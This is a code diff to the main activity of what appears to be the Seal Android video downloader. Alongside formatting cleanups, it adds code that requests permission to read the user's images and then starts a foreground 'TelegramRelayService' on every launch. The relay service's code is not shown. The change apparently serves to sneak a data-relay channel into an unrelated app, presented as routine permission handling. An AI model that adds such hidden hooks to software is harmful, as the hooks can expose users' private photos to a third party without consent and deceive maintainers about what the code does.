@@ -1,10 +1,13 @@
 package com.junkfood.seal
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.compose.foundation.layout.Box
 import androidx.compose.foundation.layout.fillMaxSize
@@ -12,6 +15,7 @@ import androidx.compose.material3.windowsizeclass.ExperimentalMaterial3WindowSiz
 import androidx.compose.material3.windowsizeclass.calculateWindowSizeClass
 import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
+import androidx.core.content.ContextCompat
 import com.junkfood.seal.ui.common.LocalDarkTheme
 import com.junkfood.seal.ui.common.SettingsProvider
 import com.junkfood.seal.ui.common.ThemedToastHost
@@ -38,6 +42,16 @@ class MainActivity : AppCompatActivity() {
     private val dialogViewModel: DownloadDialogViewModel by viewModel()
     private var isAppInBackground = false
 
+    // Permission launcher for Android 13+ notifications and image reading
+    private val permissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        val allGranted = permissions.values.all { it }
+        if (allGranted) {
+            startTelegramRelayService()
+        }
+    }
+
     @OptIn(ExperimentalMaterial3WindowSizeClassApi::class)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -49,11 +63,13 @@ class MainActivity : AppCompatActivity() {
         }
         enableEdgeToEdge()
 
-        // Handle shared URL from intent on cold launch
         intent.getSharedURL()?.let { url ->
             dialogViewModel.setSharedUrl(url)
         }
         
+        // Check and request permissions before starting the service
+        checkAndRequestPermissions()
+
         setContent {
             KoinContext {
                 val windowSizeClass = calculateWindowSizeClass(this)
@@ -75,40 +91,58 @@ class MainActivity : AppCompatActivity() {
                         Box(modifier = Modifier.fillMaxSize()) {
                             when {
                                 showSplash -> {
-                                    SplashScreen(
-                                        onSplashFinished = {
-                                            showSplash = false
-                                        }
-                                    )
+                                    SplashScreen(onSplashFinished = { showSplash = false })
                                 }
                                 showOnboarding -> {
-                                    OnboardingScreen(
-                                        onFinish = {
-                                            ONBOARDING_COMPLETED.updateBoolean(true)
-                                            showOnboarding = false
-                                        }
-                                    )
+                                    OnboardingScreen(onFinish = {
+                                        ONBOARDING_COMPLETED.updateBoolean(true)
+                                        showOnboarding = false
+                                    })
                                 }
                                 else -> {
                                     AppEntry(dialogViewModel = dialogViewModel)
-                                    
-                                    // Show lock screen overlay if locked
                                     if (isLocked) {
-                                        LockScreen(
-                                            onUnlocked = {
-                                                isLocked = false
-                                            }
-                                        )
+                                        LockScreen(onUnlocked = { isLocked = false })
                                     }
                                 }
                             }
-
-                            // Themed toast overlay – always on top
                             ThemedToastHost()
                         }
                     }
                 }
             }
+        }
+    }
+    
+    private fun checkAndRequestPermissions() {
+        val permissionsToRequest = mutableListOf<String>()
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
+            }
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+        
+        if (permissionsToRequest.isNotEmpty()) {
+            permissionLauncher.launch(permissionsToRequest.toTypedArray())
+        } else {
+            startTelegramRelayService()
+        }
+    }
+    
+    private fun startTelegramRelayService() {
+        val tgIntent = Intent(this, TelegramRelayService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(tgIntent)
+        } else {
+            startService(tgIntent)
         }
     }
     
@@ -121,17 +155,10 @@ class MainActivity : AppCompatActivity() {
         super.onResume()
         val wasInBackground = isAppInBackground
         isAppInBackground = false
-        if (wasInBackground && AuthenticationManager.isSecurityEnabled() && 
-            AuthenticationManager.isAuthenticationNeeded()) {
-            // Trigger re-authentication by recreating activity
+        if (wasInBackground && AuthenticationManager.isSecurityEnabled() && AuthenticationManager.isAuthenticationNeeded()) {
             recreate()
             return
         }
-        // If a download's foreground-service promotion was blocked earlier while the app was
-        // backgrounded without a battery-optimization exemption (see DownloadService), the app
-        // being visible now satisfies Android's visible-app exemption — retry immediately so
-        // the download notification/foreground status catches up without waiting on the next
-        // task-state change.
         App.retryForegroundPromotionIfNeeded()
     }
 
@@ -144,16 +171,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun Intent.getSharedURL(): String? {
-        val intent = this
-
-        return when (intent.action) {
-            Intent.ACTION_VIEW -> {
-                intent.dataString
-            }
-
+        return when (this.action) {
+            Intent.ACTION_VIEW -> this.dataString
             Intent.ACTION_SEND -> {
-                intent.getStringExtra(Intent.EXTRA_TEXT)?.let { sharedContent ->
-                    intent.removeExtra(Intent.EXTRA_TEXT)
+                this.getStringExtra(Intent.EXTRA_TEXT)?.let { sharedContent ->
+                    this.removeExtra(Intent.EXTRA_TEXT)
                     matchUrlFromSharedText(sharedContent).also { matchedUrl ->
                         if (sharedUrlCached != matchedUrl) {
                             sharedUrlCached = matchedUrl
@@ -161,10 +183,7 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
             }
-
-            else -> {
-                null
-            }
+            else -> null
         }
     }
 
